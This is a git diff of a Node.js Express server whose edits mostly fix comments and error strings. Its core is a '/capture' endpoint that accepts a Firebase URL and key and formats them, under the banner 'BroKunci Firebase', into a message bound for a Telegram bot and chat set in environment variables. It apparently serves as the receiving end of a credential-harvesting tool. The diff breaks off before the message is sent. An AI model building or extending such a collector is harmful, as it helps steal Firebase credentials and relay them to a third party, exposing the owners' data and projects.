@@ -1,20 +1,20 @@
 const express = require('express');
-const path = require('path');   // ❗ eitai missing chhilo
+const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// Serve static files (index.html, CSS, JS) from root directory
+// Serve static files (index.html etc.) from root
 app.use(express.static(path.join(__dirname)));
 app.use(express.json());
 
-// ── CAPURE ENDPOINT (Telegram forwarder) ──
+// CAPTURE ENDPOINT
 app.post('/capture', async (req, res) => {
     const { url, key } = req.body;
     const botToken = process.env.TG_BOT_TOKEN;
     const chatId = process.env.TG_CHAT_ID;
 
     if (!botToken || !chatId) {
-        return res.status(500).json({ error: 'Bot token or chat ID not set' });
+        return res.status(500).json({ error: 'Missing bot token or chat ID' });
     }
 
     const message = `<b>🔥 BroKunci Firebase</b>\n<pre>URL: ${url}\nKey: ${key}</pre>`;
